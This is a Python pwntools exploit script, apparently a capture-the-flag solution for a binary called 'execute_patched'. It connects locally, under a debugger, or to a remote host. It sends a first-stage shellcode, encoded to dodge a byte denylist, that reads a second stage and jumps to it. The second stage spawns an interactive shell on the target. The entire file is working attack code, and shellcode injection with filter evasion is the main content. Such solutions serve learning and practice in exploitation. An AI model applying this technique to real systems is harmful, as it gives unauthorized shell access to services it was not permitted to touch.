#!/usr/bin/env python3

from pwn import *

e = ELF("./execute_patched")
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(main+0x30)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    denylist = b'\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67'
    # The following doesn't work because the payload has size 0x7c, which is too long.
    # raw_sc = asm(shellcraft.sh())
    # payload = encode(raw_sc, avoid=denylist)

    # stage 1: read more content and jmp to the rsp
    payload = asm(shellcraft.read(0, 'rsp', 100) + '\n jmp rsp')
    payload = encode(payload, avoid=denylist)
    r.send(payload)

    # stage 2: pass the actual shellcode
    payload = asm(shellcraft.sh())
    r.send(payload)

    r.interactive()

if __name__ == "__main__":
    main()
